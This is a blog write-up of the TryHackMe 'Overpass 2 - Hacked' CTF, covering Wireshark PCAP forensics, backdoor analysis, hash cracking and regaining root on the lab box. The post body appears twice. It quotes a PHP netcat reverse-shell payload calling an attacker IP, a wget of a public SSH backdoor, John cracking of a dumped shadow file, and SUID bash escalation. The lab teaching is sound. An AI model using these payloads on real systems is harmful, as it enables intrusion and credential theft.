<!DOCTYPE html>
<html lang="en">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
<meta name="language" content="en">

<!-- Twitter And Open Graph Meta -->
<!-- Open Graph Meta Tags -->
<meta property="og:title" content="Tryhackme - Overpass 2 - Hacked">
<meta property="og:type" content="Article">
<meta property="og:url" content="http://localhost:4000/tryhackme-overpass-2-hacked/">
<meta name="image" property="og:image" content="/assets/img/avatar.jpg">
<meta property="og:image:alt" content="">
<meta property="og:site_name" content="Mr0Wido's Blog">
<meta property="og:locale" content="en_US">

<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@">
<meta name="twitter:title" content="Tryhackme - Overpass 2 - Hacked">
<meta name="twitter:image" content="/assets/img/avatar.jpg">



<!-- css -->
<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<link rel="canonical" href="/tryhackme-overpass-2-hacked/">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



<title>Tryhackme - Overpass 2 - Hacked - Mr0Wido's Blog</title>



<!-- Script -->
<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>





    <title>Tryhackme - Overpass 2 - Hacked - Mr0Wido's Blog</title>
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
    
  
  </head>
  <body>
    <header class="site-header">
  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
  <div class="site-title">
    <a href="http://localhost:4000">Mr0Wido's Blog</a>
  </div>
  <nav class="site-nav">
    <ul class="site-nav__list">
      <li class="site-nav__item">
        <a class="site-nav__link " href="/">Home</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/whoami/">Whoami</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/posts/">Posts</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/projects/">Projects</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/cv/">CV</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/categories/">Categories</a>
      </li>
      <li class="site-nav__item">
        <div class="search">
          <input type="text" id="search-input" placeholder="Search...">
          <i class="fas fa-search"></i>
          <ul id="results-container"></ul>
        </div>
      </li>
    </ul>
  </nav>
</header>


<!-- 360 to 980 -->
<header class="header-mobile">
  <div class="header-inner clearfix">
    <div class="nav-btn nav-slider">
      <i class="fa-solid fa-bars"></i>
    </div>
    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
    <div class="site-title">
      <a href="http://localhost:4000">Mr0Wido's Blog</a>
    </div>
  </div>
</header>
<nav class="sidebar">
  <div class="nav-header">
    <div class="nav-search">
      <div class="search">
        <i class="fas fa-search"></i>
        <input type="search" name="search" id="search-input" placeholder="Search...">
        <ul id="results-container"></ul>
      </div>
    </div>
  </div>
  <ul class="nav-categories ul-base">
    <li><a class="site-nav__link " href="/">Home</a></li>
    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
    <li><a class="site-nav__link " href="/cv/">CV</a></li>
    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
  </ul>
  <ul class="social ul-base">
    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
  </ul>
  <div class="copyright">
    <span> © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
  </div>
</nav>
<div class="overlay"></div>
    
    <div class="container-default">
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">Tryhackme - Overpass 2 - Hacked</h1>
  <div class="post__content">
    <p>This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.</p>

<p><br></p>

<hr>

<p><br></p>
<h2 id="1-forensics---analyse-the-pcap">1. Forensics - Analyse the PCAP</h2>
<p>Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.</p>

<p>Can you work out how the attacker got in, and hack your way back into Overpass’ production server?</p>

<p>Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.</p>

<p><strong><code class="language-plaintext highlighter-rouge">md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc</code></strong></p>

<p><br></p>
<h3 id="11-what-was-the-url-of-the-page-they-used-to-upload-a-reverse-shell">1.1 What was the URL of the page they used to upload a reverse shell?</h3>

<p>Open the <strong><code class="language-plaintext highlighter-rouge">overpass2.pcapng</code></strong> file in Wireshark and analyze the <strong><code class="language-plaintext highlighter-rouge">HTTP</code></strong> traffic (enter http as filter).</p>

<p><img src="/assets/img/tryhackme/overpass-2/http.png" alt="http"></p>

<p>Right-click on the first http frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>. Here is the first request.</p>

<p><img src="/assets/img/tryhackme/overpass-2/tcp.png" alt="tcp"></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">/development/</code></strong></p>

<p><br></p>
<h3 id="12-what-payload-did-the-attacker-use-to-gain-access">1.2 What payload did the attacker use to gain access?</h3>
<p>Now, we are trying to find the reverse shell that the attacker has uploaded to the system. So we apply this filter.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$http.request.method == "POST"
</code></pre></div></div>
<p>And here it is,</p>

<p><img src="/assets/img/tryhackme/overpass-2/post.png" alt="post"></p>

<p>Right-click on the HTTP frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/payload.png" alt="payload"></p>

<p>Answer : <code class="language-plaintext highlighter-rouge">&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;</code></p>

<p><br></p>
<h3 id="13-what-password-did-the-attacker-use-to-privesc">1.3 What password did the attacker use to privesc?</h3>
<p>Now, <strong><code class="language-plaintext highlighter-rouge">CTRL+F</code></strong> to search. After that, we set the <strong><code class="language-plaintext highlighter-rouge">string</code></strong> and searching for requests containing <strong><code class="language-plaintext highlighter-rouge">passwords</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/string.png" alt="string"></p>

<p>Now, requests that contain passwords from this search will appear marked.</p>

<p><img src="/assets/img/tryhackme/overpass-2/marked.png" alt="mark"></p>

<p>We look at the TCP Stream and we have james’ password.</p>

<p><img src="/assets/img/tryhackme/overpass-2/password.png" alt="password"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">*************</code></strong></p>

<p><br></p>
<h3 id="14-how-did-the-attacker-establish-persistence">1.4 How did the attacker establish persistence?</h3>
<p>Still in the same stream, scrolling down reveals that the attacker has downloaded an ssh backdoor to establish persistence.</p>

<p><img src="/assets/img/tryhackme/overpass-2/git.png" alt="git"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">https://github.com/NinjaJc01/ssh-backdoor</code></strong></p>

<p><br></p>
<h3 id="15-using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable">1.5 Using the fasttrack wordlist, how many of the system passwords were crackable?</h3>
<p>In the same stream, the attacker dumped the content of the <strong><code class="language-plaintext highlighter-rouge">/etc/shadow</code></strong> file just before downloading the SSH backdoor.</p>

<p><img src="/assets/img/tryhackme/overpass-2/hosts.png" alt="hosts"></p>

<p>Save the content in a file and crack it with <strong><code class="language-plaintext highlighter-rouge">John</code></strong> against the <strong><code class="language-plaintext highlighter-rouge">fasttrack</code></strong> wordlist to confirm how many passwords are crackable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlist/fasttrack.txt shadow.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/shadow.png" alt="shadow"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">4</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="2-research---analyse-the-code">2. Research - Analyse the Code</h2>
<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
<br></p>
<h3 id="21-whats-the-default-hash-for-the-backdoor">2.1 What’s the default hash for the backdoor?</h3>

<p>Still, in the same stream, we see that the attacker executes the backdoor with the <code class="language-plaintext highlighter-rouge">-a</code> option, along with a <code class="language-plaintext highlighter-rouge">hash</code>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/back.png" alt="back"></p>

<p>What does the -a option do? Let’s download the backdoor locally and check ourselves what this option is.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
$ chmod +x backdoor 
$ ./backdoor -h
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door"></p>

<p>As you can see here, if no hash is entered in the -a option, the tool itself uses a default hash.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></strong></p>

<p><br></p>
<h3 id="22-whats-the-hardcoded-salt-for-the-backdoor">2.2 What’s the hardcoded salt for the backdoor?</h3>
<p>Reading the source code of the backdoor <a href="https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go">https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go</a>, reveals that the salt is hardcoded.</p>

<p><img src="/assets/img/tryhackme/overpass-2/salt.png" alt="salt"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">1c362db832f3f864c8c2fe05f2002a05</code></strong></p>

<p><br></p>
<h3 id="23-what-was-the-hash-that-the-attacker-used---go-back-to-the-pcap-for-this">2.3 What was the hash that the attacker used? - Go back to the PCAP for this!</h3>
<p>We saw previously that the attacker used a custom hash.</p>

<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></strong></p>

<p><br></p>
<h3 id="24-crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-whats-the-password">2.4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</h3>

<p>Analyzing the source code, we can see that the password is salted as follows.</p>

<p><img src="/assets/img/tryhackme/overpass-2/sha.png" alt="sha"></p>

<p>The salt is appended to the password, and SHA512 of the resulting string makes the hash.
We create hash.txt and paste the following into it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/cat.png" alt="cat"></p>

<p>Now, let’s crack it with john. As a format, we use <code class="language-plaintext highlighter-rouge">(sha512($pass.$salt))</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/hash.png" alt="hash"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">********</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="3-attack---get-back-in">3. Attack - Get back in!</h2>
<p>Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.</p>

<p>There’s flags on the box that Overpass can’t afford to lose by formatting the server!</p>

<p><br></p>
<h3 id="31-the-attacker-defaced-the-website-what-message-did-they-leave-as-a-heading">3.1 The attacker defaced the website. What message did they leave as a heading?</h3>
<p>Let’s do an nmap scan.</p>

<p><img src="/assets/img/tryhackme/overpass-2/nmap.png" alt="nmap"></p>

<p>As we see here, 3 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the others are <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>, <strong><code class="language-plaintext highlighter-rouge">SSH:2222</code></strong>.
Connect to port 80. The index page shows the following message.</p>

<p><img src="/assets/img/tryhackme/overpass-2/message.png" alt="message"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">H4ck3d by CooctusClan</code></strong></p>

<p><br></p>
<h3 id="32-using-the-information-youve-found-previously-hack-your-way-back-in">3.2 Using the information you’ve found previously, hack your way back in!</h3>
<p>It appears port 2222 is open. Logging in with the password cracked earlier. (november 16)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh 10.10.128.157 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/ssh.png" alt="ssh"></p>

<p><br></p>
<h3 id="33-whats-the-user-flag">3.3 What’s the user flag?</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/james/user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/user.png" alt="user"></p>

<p><br></p>
<h3 id="34-whats-the-root-flag">3.4 What’s the root flag?</h3>
<p>There is a copy of bash in James’s home directory.</p>

<p><img src="/assets/img/tryhackme/overpass-2/bash.png" alt="bash"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./.suid_bash -p 
$ cat /root/root.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/root.png" alt="root"></p>

<p><img src="/assets/img/tryhackme/overpass-2/root-flag.png" alt="root-flag"></p>

<p><br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 09, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">security,</span>
          
          <span class="post__tags-item">forensics,</span>
          
          <span class="post__tags-item">wireshark</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=Tryhackme%20-%20Overpass%202%20-%20Hacked&url=http://localhost:4000/tryhackme-overpass-2-hacked/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-overpass-2-hacked/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-overpass-2-hacked/';
    this.page.identifier = '/tryhackme-overpass-2-hacked';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
    </div>

    <div class="container-medium">
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">Tryhackme - Overpass 2 - Hacked</h1>
  <div class="post__content">
    <p>This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.</p>

<p><br></p>

<hr>

<p><br></p>
<h2 id="1-forensics---analyse-the-pcap">1. Forensics - Analyse the PCAP</h2>
<p>Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.</p>

<p>Can you work out how the attacker got in, and hack your way back into Overpass’ production server?</p>

<p>Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.</p>

<p><strong><code class="language-plaintext highlighter-rouge">md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc</code></strong></p>

<p><br></p>
<h3 id="11-what-was-the-url-of-the-page-they-used-to-upload-a-reverse-shell">1.1 What was the URL of the page they used to upload a reverse shell?</h3>

<p>Open the <strong><code class="language-plaintext highlighter-rouge">overpass2.pcapng</code></strong> file in Wireshark and analyze the <strong><code class="language-plaintext highlighter-rouge">HTTP</code></strong> traffic (enter http as filter).</p>

<p><img src="/assets/img/tryhackme/overpass-2/http.png" alt="http"></p>

<p>Right-click on the first http frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>. Here is the first request.</p>

<p><img src="/assets/img/tryhackme/overpass-2/tcp.png" alt="tcp"></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">/development/</code></strong></p>

<p><br></p>
<h3 id="12-what-payload-did-the-attacker-use-to-gain-access">1.2 What payload did the attacker use to gain access?</h3>
<p>Now, we are trying to find the reverse shell that the attacker has uploaded to the system. So we apply this filter.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$http.request.method == "POST"
</code></pre></div></div>
<p>And here it is,</p>

<p><img src="/assets/img/tryhackme/overpass-2/post.png" alt="post"></p>

<p>Right-click on the HTTP frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/payload.png" alt="payload"></p>

<p>Answer : <code class="language-plaintext highlighter-rouge">&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;</code></p>

<p><br></p>
<h3 id="13-what-password-did-the-attacker-use-to-privesc">1.3 What password did the attacker use to privesc?</h3>
<p>Now, <strong><code class="language-plaintext highlighter-rouge">CTRL+F</code></strong> to search. After that, we set the <strong><code class="language-plaintext highlighter-rouge">string</code></strong> and searching for requests containing <strong><code class="language-plaintext highlighter-rouge">passwords</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/string.png" alt="string"></p>

<p>Now, requests that contain passwords from this search will appear marked.</p>

<p><img src="/assets/img/tryhackme/overpass-2/marked.png" alt="mark"></p>

<p>We look at the TCP Stream and we have james’ password.</p>

<p><img src="/assets/img/tryhackme/overpass-2/password.png" alt="password"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">*************</code></strong></p>

<p><br></p>
